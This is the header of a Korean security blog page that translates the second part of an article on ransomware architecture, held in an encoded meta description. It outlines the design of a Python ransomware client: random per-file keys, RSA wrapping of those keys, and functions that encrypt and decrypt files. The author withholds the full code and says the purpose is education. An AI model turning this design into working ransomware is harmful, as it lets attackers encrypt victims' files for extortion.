

<!DOCTYPE html>
<html lang="ko-KR" data-default-color-scheme="&#34;auto&#34;">



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
  <link rel="icon" type="image/png" href="/img/favicon.ico">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694;! idioth&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xAE38;&amp;#xACE0; &amp;#xAE38;&amp;#xC5C8;&amp;#xB358; &amp;#xC911;&amp;#xAC04;&amp;#xACE0;&amp;#xC0AC; &amp;#xAE30;&amp;#xAC04;&amp;#xC774;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD558;&amp;#xC9C0;&amp;#xB9CC; &amp;#xC81C; &amp;#xC911;&amp;#xAC04;&amp;#xACE0;&amp;#xC0AC; &amp;#xAE30;&amp;#xAC04;&amp;#xC740; &amp;#xB354; &amp;#xAE38;&amp;#xC5B4;&amp;#xC11C; &amp;#xC544;&amp;#xC9C1; &amp;#xB05D;&amp;#xB098;&amp;#xC9C0; &amp;#xC54A;&amp;#xC558;&amp;#xB124;&amp;#xC694;. &amp;#xC2DC;&amp;#xD5D8; &amp;#xD558;&amp;#xB098;&amp;#xC640; &amp;#xB300;&amp;#xCCB4; &amp;#xACFC;&amp;#xC81C; 3&amp;#xAC1C;&amp;#xAC00; &amp;#xB0A8;&amp;#xC544;&amp;#xC788;&amp;#xB294; &amp;#xC0B6;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xAC8C;&amp;#xB2E4;&amp;#xAC00; &amp;#xACFC;&amp;#xBAA9; &amp;#xD558;&amp;#xB098;&amp;#xB294; &amp;#xC591;&amp;#xC774; &amp;#xB108;&amp;#xBB34; &amp;#xB9CE;&amp;#xC544;&amp;#xC11C; &amp;#xC120;&amp;#xD0DD;&amp;#xACFC; &amp;#xC9D1;&amp;#xC911;&amp;#xC744; &amp;#xD588;&amp;#xB294;&amp;#xB370; &amp;#xC81C;&amp;#xAC00; &amp;#xC120;&amp;#xD0DD;&amp;#xD55C; &amp;#xBD80;&amp;#xBD84;&amp;#xC5D0;&amp;#xC11C; 12 &amp;#xBB38;&amp;#xC81C; &amp;#xC911; &amp;#xD55C; &amp;#xBB38;&amp;#xC81C; &amp;#xB098;&amp;#xC654;&amp;#xB124;&amp;#xC694;. 10&amp;#xC810; &amp;#xBC11;&amp;#xC73C;&amp;#xB85C; &amp;#xBC1B;&amp;#xC744; &amp;#xAC83; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD558;&amp;#xD558;&amp;#xD558;&amp;#xD558;&amp;#xD558;&amp;#xD558;&amp;#xD558;&amp;#xD558;&amp;#xD558;&amp;#xD558;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2021/04/25/idioth/arch_of_ransomware_part2/Untitled.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC774;&amp;#xBBF8; &amp;#xC9C0;&amp;#xB098;&amp;#xAC04; &amp;#xC77C; &amp;#xD6C4;&amp;#xD68C;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;&amp;#x2026; &amp;#xAE30;&amp;#xB9D0; &amp;#xB54C; &amp;#xB354; &amp;#xC798;&amp;#xD558;&amp;#xBA74; &amp;#xB418;&amp;#xB2C8;&amp;#xAE4C;&amp;#xC694;^^. &amp;#xC7A1;&amp;#xB2F4;&amp;#xC774; &amp;#xAE38;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC624;&amp;#xB298;&amp;#xC740; &amp;#xC800;&amp;#xBC88; &amp;#xAC8C;&amp;#xC2DC;&amp;#xAE00;&amp;#xC5D0; &amp;#xC774;&amp;#xC5B4;&amp;#xC11C; &amp;#xD30C;&amp;#xD2B8; 2&amp;#xB97C; &amp;#xC9C4;&amp;#xD589;&amp;#xD558;&amp;#xB3C4;&amp;#xB85D; &amp;#xD558;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;!&lt;/p&gt;
&lt;p&gt;&amp;#xC774;&amp;#xC804; &amp;#xAC8C;&amp;#xC2DC;&amp;#xAE00; &amp;#xBCF4;&amp;#xB7EC;&amp;#xAC00;&amp;#xAE30;: &lt;a href=&#34;https://hackyboiz.github.io/2021/04/11/idioth/arch_of_ransomware_part1/&#34;&gt;[Translation] Architecture of Ransomware Part 1&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;#xC6D0;&amp;#xBB38; &amp;#xAE00; : &lt;a href=&#34;https://infosecwriteups.com/architecture-of-a-ransomware-2-2-e22d8eb11cee&#34;&gt;Architecture of a ransomware (2/2)&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://hackyboiz.github.io/2021/04/11/idioth/arch_of_ransomware_part1/&#34;&gt;Part 1&lt;/a&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xB79C;&amp;#xC12C;&amp;#xC6E8;&amp;#xC5B4;&amp;#xAC00; &amp;#xD6A8;&amp;#xACFC;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; &amp;#xB3D9;&amp;#xC791;&amp;#xD558;&amp;#xB294;&amp;#xB370; &amp;#xD544;&amp;#xC694;&amp;#xD55C; &amp;#xC8FC;&amp;#xC694;&amp;#xD55C; &amp;#xAC1C;&amp;#xB150;&amp;#xC5D0; &amp;#xB300;&amp;#xD574;&amp;#xC11C; &amp;#xC124;&amp;#xBA85;&amp;#xD588;&amp;#xB2E4;. &amp;#xC774;&amp;#xBC88; &amp;#xD30C;&amp;#xD2B8;&amp;#xC5D0;&amp;#xC11C; &amp;#xD30C;&amp;#xC774;&amp;#xC36C; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xAC1C;&amp;#xB150;&amp;#xB4E4;&amp;#xC744; &amp;#xBCF4;&amp;#xC5EC;&amp;#xC904; &amp;#xAC83;&amp;#xC774;&amp;#xB2E4;. &amp;#xB610;&amp;#xD55C; &amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xB97C; &amp;#xC704;&amp;#xD55C; pycryptodome &amp;#xD30C;&amp;#xC774;&amp;#xC36C; &amp;#xB77C;&amp;#xC774;&amp;#xBE0C;&amp;#xB7EC;&amp;#xB9AC;&amp;#xC758; &amp;#xAE30;&amp;#xBCF8;&amp;#xC801;&amp;#xC778; &amp;#xC0AC;&amp;#xC6A9;&amp;#xBC95;&amp;#xB3C4; &amp;#xB2E4;&amp;#xB8F0; &amp;#xAC83;&amp;#xC774;&amp;#xB2E4;. &amp;#xC2A4;&amp;#xD06C;&amp;#xB9BD;&amp;#xD2B8; &amp;#xD0A4;&amp;#xB514;&amp;#xB4E4;&amp;#xC774; &amp;#xC545;&amp;#xC6A9;&amp;#xD560; &amp;#xC218; &amp;#xC5C6;&amp;#xB3C4;&amp;#xB85D; &amp;#xC804;&amp;#xCCB4; &amp;#xC18C;&amp;#xC2A4; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xC62C;&amp;#xB9AC;&amp;#xC9C4; &amp;#xC54A;&amp;#xC744; &amp;#xAC83;&amp;#xC774;&amp;#xB2E4;. &amp;#xC774; &amp;#xAC8C;&amp;#xC2DC;&amp;#xAE00;&amp;#xC758; &amp;#xBAA9;&amp;#xC801;&amp;#xC740; &amp;#xC545;&amp;#xC131; &amp;#xD589;&amp;#xC704;&amp;#xC5D0; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xB77C;&amp;#xB294; &amp;#xAC83;&amp;#xC774; &amp;#xC544;&amp;#xB2C8;&amp;#xB77C; &amp;#xB79C;&amp;#xC12C;&amp;#xC6E8;&amp;#xC5B4; &amp;#xC545;&amp;#xC131;&amp;#xCF54;&amp;#xB4DC;&amp;#xC5D0; &amp;#xB300;&amp;#xD55C; &amp;#xC9C0;&amp;#xC2DD;&amp;#xC744; &amp;#xACF5;&amp;#xC720;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC774;&amp;#xB2E4;.&lt;/p&gt;
&lt;h1 id=&#34;&amp;#xC77C;&amp;#xBC18;&amp;#xC801;&amp;#xC778;-&amp;#xACE0;&amp;#xB824;-&amp;#xC0AC;&amp;#xD56D;&#34;&gt;&lt;a href=&#34;#&amp;#xC77C;&amp;#xBC18;&amp;#xC801;&amp;#xC778;-&amp;#xACE0;&amp;#xB824;-&amp;#xC0AC;&amp;#xD56D;&#34; class=&#34;headerlink&#34; title=&#34;&amp;#xC77C;&amp;#xBC18;&amp;#xC801;&amp;#xC778; &amp;#xACE0;&amp;#xB824; &amp;#xC0AC;&amp;#xD56D;&#34;&gt;&lt;/a&gt;&amp;#xC77C;&amp;#xBC18;&amp;#xC801;&amp;#xC778; &amp;#xACE0;&amp;#xB824; &amp;#xC0AC;&amp;#xD56D;&lt;/h1&gt;&lt;p&gt;&amp;#xC5EC;&amp;#xB7EC; &amp;#xAC1C;&amp;#xC758; &amp;#xC624;&amp;#xD508; &amp;#xC18C;&amp;#xC2A4; &amp;#xB79C;&amp;#xC12C;&amp;#xC6E8;&amp;#xC5B4;&amp;#xAC00; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xBA70; &amp;#xB79C;&amp;#xC12C;&amp;#xC6E8;&amp;#xC5B4; &amp;#xAC1C;&amp;#xBC1C;&amp;#xC5D0; &amp;#xAD00;&amp;#xD574;&amp;#xC11C; &amp;#xCC3E;&amp;#xC544;&amp;#xBCF4;&amp;#xB2E4;&amp;#xAC00; &lt;a href=&#34;https://medium.com/u/ea2f2c25847b?source=post_page-----e22d8eb11cee--------------------------------&#34;&gt;Tarc&amp;#xED;sio Marinho&lt;/a&gt;&amp;#xAC00; &amp;#xAC1C;&amp;#xBC1C;&amp;#xD55C; &lt;a href=&#34;https://github.com/tarcisio-marinho/GonnaCry&#34;&gt;GonnaCry&lt;/a&gt;&amp;#xB77C;&amp;#xB294; &amp;#xB79C;&amp;#xC12C;&amp;#xC6E8;&amp;#xC5B4;&amp;#xB97C; &amp;#xBC1C;&amp;#xACAC;&amp;#xD588;&amp;#xB2E4;. &amp;#xCF54;&amp;#xB4DC;&amp;#xAC00; &amp;#xB9E4;&amp;#xC6B0; &amp;#xBD84;&amp;#xBA85;&amp;#xD558;&amp;#xBA70; &amp;#xC77D;&amp;#xC5B4; &amp;#xBCF4;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xCD94;&amp;#xCC9C;&amp;#xD55C;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xADF8;&amp;#xC758; &amp;#xB79C;&amp;#xC12C;&amp;#xC6E8;&amp;#xC5B4;&amp;#xB294; &amp;#x201C;management side&amp;#x201D;&amp;#xB97C; &amp;#xC704;&amp;#xD55C; &amp;#xBAA8;&amp;#xB4E0; &amp;#xCF54;&amp;#xB4DC;&amp;#xAC00; &amp;#xD3EC;&amp;#xD568;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xB2E4;. &amp;#xADF8;&amp;#xB294; &amp;#xBCF5;&amp;#xD638;&amp;#xD654; &amp;#xD0A4;&amp;#xB97C; &amp;#xAD00;&amp;#xB9AC;&amp;#xD558;&amp;#xACE0; &amp;#xAC10;&amp;#xC5FC;&amp;#xB41C; &amp;#xD074;&amp;#xB77C;&amp;#xC774;&amp;#xC5B8;&amp;#xD2B8;&amp;#xC640; &amp;#xD1B5;&amp;#xC2E0;&amp;#xD558;&amp;#xB294; &amp;#xD574;&amp;#xCEE4; &amp;#xCE21; &amp;#xC11C;&amp;#xBC84;&amp;#xB97C; &amp;#xCF54;&amp;#xB529;&amp;#xD588;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xD544;&amp;#xC790;&amp;#xB294; &amp;#xB79C;&amp;#xC12C;&amp;#xC6E8;&amp;#xC5B4;&amp;#xAC00; &amp;#xC5B4;&amp;#xB5BB;&amp;#xAC8C; &amp;#xB3D9;&amp;#xC791;&amp;#xD558;&amp;#xB294;&amp;#xC9C0; &amp;#xBC30;&amp;#xC6B0;&amp;#xAE30; &amp;#xC704;&amp;#xD574; &amp;#xBAA8;&amp;#xB4E0; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xC791;&amp;#xC131;&amp;#xD558;&amp;#xC600;&amp;#xACE0;, &amp;#xC2E4;&amp;#xC81C; &amp;#xB79C;&amp;#xC12C;&amp;#xC6E8;&amp;#xC5B4;&amp;#xB294; &amp;#xC774; &amp;#xBD80;&amp;#xBD84;&amp;#xC744; &amp;#xBAA8;&amp;#xB450; &amp;#xB2E4;&amp;#xB974;&amp;#xAC8C; &amp;#xCC98;&amp;#xB9AC;&amp;#xD558;&amp;#xBBC0;&amp;#xB85C; &amp;#xD574;&amp;#xB2F9; &amp;#xBD80;&amp;#xBD84;&amp;#xC740; &amp;#xB2E4;&amp;#xB8E8;&amp;#xACE0; &amp;#xC2F6;&amp;#xC9C0; &amp;#xC54A;&amp;#xC558;&amp;#xB2E4;. payment&amp;#xB97C; &amp;#xB4F1;&amp;#xB85D;&amp;#xD558;&amp;#xACE0; &amp;#xBCF5;&amp;#xD638;&amp;#xD654; &amp;#xD0A4;&amp;#xB97C; &amp;#xC804;&amp;#xC1A1;&amp;#xD558;&amp;#xB294; &amp;#xC790;&amp;#xB3D9;&amp;#xD654; &amp;#xC11C;&amp;#xBE44;&amp;#xC2A4;, victim&amp;#xACFC; &amp;#xC9C1;&amp;#xC811; &amp;#xC0C1;&amp;#xD638;&amp;#xC791;&amp;#xC6A9;&amp;#xD558;&amp;#xB294; &amp;#xD1A0;&amp;#xB974; &amp;#xC774;&amp;#xBA54;&amp;#xC77C; &amp;#xC8FC;&amp;#xC18C;, &amp;#xBA87; &amp;#xAC1C;&amp;#xC758; &amp;#xC0D8;&amp;#xD50C; &amp;#xD30C;&amp;#xC77C;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &amp;#xBCF5;&amp;#xD638;&amp;#xD654;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB294;&amp;#xC9C0; &amp;#xD655;&amp;#xC778;&amp;#xD558;&amp;#xB294; &amp;#xC2DC;&amp;#xC2A4;&amp;#xD15C; &amp;#xB4F1;&amp;#xC774; &amp;#xC788;&amp;#xC744; &amp;#xC218;&amp;#xB3C4; &amp;#xC788;&amp;#xB2E4;. &amp;#xC774; &amp;#xBD80;&amp;#xBD84;&amp;#xC740; &amp;#xCEA0;&amp;#xD398;&amp;#xC778;&amp;#xB9C8;&amp;#xB2E4; &amp;#xB2EC;&amp;#xB77C;&amp;#xC11C; &amp;#xB2E4;&amp;#xB8E8;&amp;#xC9C0; &amp;#xC54A;&amp;#xC744; &amp;#xAC83;&amp;#xC774;&amp;#xB2E4;. &amp;#xB098;&amp;#xB294; &amp;#xD074;&amp;#xB77C;&amp;#xC774;&amp;#xC5B8;&amp;#xD2B8; &amp;#xAC10;&amp;#xC5FC; &amp;#xCE21;&amp;#xBA74;&amp;#xC5D0; &amp;#xC8FC;&amp;#xB85C; &amp;#xD3EC;&amp;#xCEE4;&amp;#xC2A4;&amp;#xB97C; &amp;#xB9DE;&amp;#xCD9C; &amp;#xAC83;&amp;#xC774;&amp;#xB2E4;.&lt;/p&gt;
&lt;h1 id=&#34;&amp;#xC5B8;&amp;#xC5B4;-&amp;#xC120;&amp;#xD0DD;&#34;&gt;&lt;a href=&#34;#&amp;#xC5B8;&amp;#xC5B4;-&amp;#xC120;&amp;#xD0DD;&#34; class=&#34;headerlink&#34; title=&#34;&amp;#xC5B8;&amp;#xC5B4; &amp;#xC120;&amp;#xD0DD;&#34;&gt;&lt;/a&gt;&amp;#xC5B8;&amp;#xC5B4; &amp;#xC120;&amp;#xD0DD;&lt;/h1&gt;&lt;p&gt;&amp;#xD544;&amp;#xC790;&amp;#xB294; &amp;#xBA87; &amp;#xAC00;&amp;#xC9C0; &amp;#xC774;&amp;#xC720;&amp;#xB85C; &amp;#xD30C;&amp;#xC774;&amp;#xC36C;&amp;#xC744; &amp;#xC120;&amp;#xD0DD;&amp;#xD588;&amp;#xB2E4;. &amp;#xC8FC;&amp;#xC694;&amp;#xD55C; &amp;#xC774;&amp;#xC720;&amp;#xB294; &amp;#x3139;&amp;#x3147; &amp;#xC77D;&amp;#xAE30; &amp;#xC27D;&amp;#xACE0; &amp;#xC774;&amp;#xD574;&amp;#xD558;&amp;#xAE30; &amp;#xC26C;&amp;#xC6B0;&amp;#xB2C8;&amp;#xAE4C;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2021/04/25/idioth/arch_of_ransomware_part2/Untitled%201.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;os.system&lt;/code&gt;&amp;#xC73C;&amp;#xB85C; &amp;#xD638;&amp;#xCD9C;&amp;#xB41C; OS&amp;#xBCC4; &amp;#xBA85;&amp;#xB839;&amp;#xC5B4;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xC73C;&amp;#xBA74; &amp;#xD06C;&amp;#xB85C;&amp;#xC2A4; &amp;#xD50C;&amp;#xB7AB;&amp;#xD3FC; &amp;#xB610;&amp;#xD55C; &amp;#xAC00;&amp;#xB2A5;&amp;#xD558;&amp;#xB2E4;. &amp;#xB610;&amp;#xD55C; &amp;#xC18D;&amp;#xB3C4;&amp;#xAC00; &amp;#xBE60;&amp;#xB974;&amp;#xACE0; &amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xB97C; &amp;#xC704;&amp;#xD55C; &amp;#xB77C;&amp;#xC774;&amp;#xBE0C;&amp;#xB7EC;&amp;#xB9AC;&amp;#xAC00; &amp;#xC788;&amp;#xB2E4;. &amp;#xB9C8;&amp;#xC9C0;&amp;#xB9C9;&amp;#xC73C;&amp;#xB85C; &amp;#xCEF4;&amp;#xD30C;&amp;#xC77C;&amp;#xB41C; &amp;#xCF54;&amp;#xB4DC; &amp;#xB09C;&amp;#xB3C5;&amp;#xD654;&amp;#xAC00; &amp;#xAC00;&amp;#xB2A5;&amp;#xD558;&amp;#xC5EC; &amp;#xB9AC;&amp;#xBC84;&amp;#xC2F1;&amp;#xD558;&amp;#xAE30; &amp;#xC5B4;&amp;#xB835;&amp;#xAC8C; &amp;#xB9CC;&amp;#xB4E4; &amp;#xC218; &amp;#xC788;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xD30C;&amp;#xC774;&amp;#xC36C; &amp;#xB77C;&amp;#xC774;&amp;#xBE0C;&amp;#xB7EC;&amp;#xB9AC;&amp;#xB97C; &amp;#xC120;&amp;#xD0DD;&amp;#xD560; &amp;#xB54C; &amp;#xB3D9;&amp;#xC77C;&amp;#xD55C; &amp;#xAE30;&amp;#xB2A5;&amp;#xC744; &amp;#xD558;&amp;#xB294; &amp;#xAC78; &amp;#xC5EC;&amp;#xB7EC; &amp;#xAC1C; &amp;#xCC3E;&amp;#xC544;&amp;#xB77C;. &amp;#xAC01;&amp;#xAC01;&amp;#xC758; &amp;#xAC83;&amp;#xC744; &amp;#xC5F0;&amp;#xAD6C;&amp;#xD558;&amp;#xACE0; &amp;#xAC00;&amp;#xC7A5; &amp;#xB9CE;&amp;#xC774; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB418;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xC120;&amp;#xD0DD;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC740; &amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xCC98;&amp;#xB7FC; &amp;#xBE60;&amp;#xB974;&amp;#xAC8C; &amp;#xBCC0;&amp;#xD654;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC5D0; &amp;#xB300;&amp;#xD574;&amp;#xC11C; &amp;#xC88B;&amp;#xC740; &amp;#xC811;&amp;#xADFC; &amp;#xBC29;&amp;#xC2DD;&amp;#xC774;&amp;#xB2E4;. &amp;#xC624;&amp;#xB798;&amp;#xB41C; &amp;#xB77C;&amp;#xC774;&amp;#xBE0C;&amp;#xB7EC;&amp;#xB9AC;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xAC70;&amp;#xB098; &lt;a href=&#34;https://blog.malwarebytes.com/threat-analysis/2018/04/lockcrypt-ransomware/&#34;&gt;Lockcrypt&lt;/a&gt;&amp;#xCC98;&amp;#xB7FC; &amp;#xC790;&amp;#xCCB4; &amp;#xAC1C;&amp;#xBC1C;&amp;#xD55C; &amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;(&amp;#xD558;&amp;#xC9C0; &amp;#xB9C8;)&amp;#xD558;&amp;#xBA74; &amp;#xB79C;&amp;#xC12C;&amp;#xC6E8;&amp;#xC5B4;&amp;#xAC00; &amp;#xBCF5;&amp;#xD638;&amp;#xD654;&amp;#xB420; &amp;#xC218;&amp;#xB3C4; &amp;#xC788;&amp;#xB2E4;.  &amp;#xC6B0;&amp;#xB9AC;&amp;#xB294; &amp;#xC798; &amp;#xC54C;&amp;#xB824;&amp;#xC9C4; &amp;#xB77C;&amp;#xC774;&amp;#xBE0C;&amp;#xB7EC;&amp;#xB9AC; &lt;a href=&#34;https://pypi.org/project/pycryptodome/&#34;&gt;pycryptodome&lt;/a&gt;&amp;#xACFC; &lt;a href=&#34;https://docs.python.org/3/library/secrets.html&#34;&gt;secrets&lt;/a&gt;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD560; &amp;#xAC83;&amp;#xC774;&amp;#xB2E4;.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Note: &amp;#xC2E4;&amp;#xC81C;&amp;#xB85C; &amp;#xBE44;&amp;#xB300;&amp;#xCE6D;+&amp;#xB300;&amp;#xCE6D; &amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xB97C; &amp;#xACB0;&amp;#xD569;&amp;#xD55C; wrapper&amp;#xAC00; &amp;#xC788;&amp;#xC9C0;&amp;#xB9CC; &amp;#xAC1C;&amp;#xB150;&amp;#xC744; &amp;#xC124;&amp;#xBA85;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD574; pycryptodome&amp;#xC744; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD574; &amp;#xAC01; &amp;#xAE30;&amp;#xB2A5;&amp;#xC744; &amp;#xAD6C;&amp;#xD604;&amp;#xD560; &amp;#xAC83;&amp;#xC774;&amp;#xB2E4;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;/2021/04/25/idioth/arch_of_ransomware_part2/Untitled%202.png&#34; alt&gt;&lt;/p&gt;
&lt;h1 id=&#34;&amp;#xD544;&amp;#xC694;&amp;#xD55C;-&amp;#xAE30;&amp;#xB2A5;-&amp;#xC694;&amp;#xC57D;&#34;&gt;&lt;a href=&#34;#&amp;#xD544;&amp;#xC694;&amp;#xD55C;-&amp;#xAE30;&amp;#xB2A5;-&amp;#xC694;&amp;#xC57D;&#34; class=&#34;headerlink&#34; title=&#34;&amp;#xD544;&amp;#xC694;&amp;#xD55C; &amp;#xAE30;&amp;#xB2A5; &amp;#xC694;&amp;#xC57D;&#34;&gt;&lt;/a&gt;&amp;#xD544;&amp;#xC694;&amp;#xD55C; &amp;#xAE30;&amp;#xB2A5; &amp;#xC694;&amp;#xC57D;&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;generate32ByteKey()&lt;/code&gt;: &amp;#xB79C;&amp;#xB364;&amp;#xD55C; 32&amp;#xBC14;&amp;#xC774;&amp;#xD2B8; &amp;#xD0A4;&amp;#xB97C; &amp;#xC0DD;&amp;#xC131;&amp;#xD55C;&amp;#xB2E4;. &amp;#xC774;&amp;#xB97C; &amp;#xC218;&amp;#xD589;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD55C; &amp;#xC5EC;&amp;#xB7EC; &amp;#xAC00;&amp;#xC9C0; &amp;#xBC29;&amp;#xBC95;&amp;#xC774; &amp;#xC788;&amp;#xB2E4;. &lt;code&gt;/dev/urandom&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xBB38;&amp;#xC790;&amp;#xC5F4;&amp;#xC744; &amp;#xAE01;&amp;#xC5B4;&amp;#xC640;&amp;#xC11C; &lt;code&gt;sha256sum&lt;/code&gt;&amp;#xC744; &amp;#xD558;&amp;#xBA74; &amp;#xB418;&amp;#xC9C0;&amp;#xB9CC; &amp;#xB9AC;&amp;#xB205;&amp;#xC2A4;&amp;#xC5D0; &amp;#xD55C;&amp;#xC815;&amp;#xC801;&amp;#xC774;&amp;#xBA70; &amp;#xD06C;&amp;#xB85C;&amp;#xC2A4; &amp;#xD50C;&amp;#xB7AB;&amp;#xD3FC;&amp;#xC73C;&amp;#xB85C; &amp;#xB9CC;&amp;#xB4E4;&amp;#xACE0; &amp;#xC2F6;&amp;#xC73C;&amp;#xBBC0;&amp;#xB85C; secrets &amp;#xB77C;&amp;#xC774;&amp;#xBE0C;&amp;#xB7EC;&amp;#xB9AC;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD560; &amp;#xAC83;&amp;#xC774;&amp;#xB2E4;. &lt;code&gt;secrets.token_hex(32)&lt;/code&gt;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xC218;&amp;#xD589;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB2E4;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;rsaEncryptSecret(string, publicKey)&lt;/code&gt;: public key&amp;#xB97C; &amp;#xAC00;&amp;#xC9C0;&amp;#xACE0; secret&amp;#xC744; &amp;#xBE44;&amp;#xB300;&amp;#xCE6D; &amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xD55C;&amp;#xB2E4;(private key&amp;#xB97C; &amp;#xD1B5;&amp;#xD574;&amp;#xC11C;&amp;#xB9CC; &amp;#xBCF5;&amp;#xD638;&amp;#xD654;&amp;#xB428;). &amp;#xC774;&amp;#xB807;&amp;#xAC8C; &amp;#xD558;&amp;#xBA74; &amp;#xAC01; &amp;#xD30C;&amp;#xC77C;&amp;#xC5D0; &amp;#xB300;&amp;#xD574; &amp;#xC0DD;&amp;#xC131;&amp;#xB41C; &amp;#xB300;&amp;#xCE6D; &amp;#xD0A4;&amp;#xB97C; publicKey&amp;#xB85C; &amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB2E4;. &amp;#xD074;&amp;#xB77C;&amp;#xC774;&amp;#xC5B8;&amp;#xD2B8;&amp;#xB294; &amp;#xAC01; &amp;#xD30C;&amp;#xC77C;&amp;#xC758; &amp;#xB300;&amp;#xCE6D; &amp;#xD0A4;&amp;#xB97C; &amp;#xBCF5;&amp;#xD638;&amp;#xD654;&amp;#xD558;&amp;#xB824;&amp;#xBA74; &amp;#xC6B0;&amp;#xB9AC;&amp;#xC758; private key&amp;#xAC00; &amp;#xD544;&amp;#xC694;&amp;#xD558;&amp;#xB2E4;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;rsaDecryptSecret(secret, privateKey)&lt;/code&gt;: private &amp;#xBE44;&amp;#xB300;&amp;#xCE6D; &amp;#xD0A4;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xB41C; &amp;#xB300;&amp;#xCE6D;&amp;#xD0A4;&amp;#xB97C; &amp;#xBCF5;&amp;#xD638;&amp;#xD654;&amp;#xD55C;&amp;#xB2E4;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;symEncryptFile(publicKey, file)&lt;/code&gt;: &amp;#xC554;&amp;#xD638;&amp;#xD654; &amp;#xB85C;&amp;#xC9C1;&amp;#xC744; &amp;#xD3EC;&amp;#xD568;&amp;#xD558;&amp;#xBBC0;&amp;#xB85C; &amp;#xAC00;&amp;#xC7A5; &amp;#xBCF5;&amp;#xC7A1;&amp;#xD55C; &amp;#xBD80;&amp;#xBD84;&amp;#xC774;&amp;#xB2E4;. &amp;#xC544;&amp;#xB798;&amp;#xC5D0; &amp;#xC790;&amp;#xC138;&amp;#xD788; &amp;#xC124;&amp;#xBA85;&amp;#xD560; &amp;#xAC70;&amp;#xC9C0;&amp;#xB9CC;, &amp;#xC774;&amp;#xB984;&amp;#xC73C;&amp;#xB85C; &amp;#xBCFC; &amp;#xC218; &amp;#xC788;&amp;#xB4EF;&amp;#xC774; &amp;#xD30C;&amp;#xC77C;&amp;#xC744; &amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xD558;&amp;#xB294; &amp;#xD568;&amp;#xC218;&amp;#xB2E4;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;symDecryptFile(privateKey, file)&lt;/code&gt;: &amp;#xD30C;&amp;#xC77C;&amp;#xC744; &amp;#xBCF5;&amp;#xD638;&amp;#xD654;&amp;#xD55C;&amp;#xB2E4;.&lt;/li&gt;
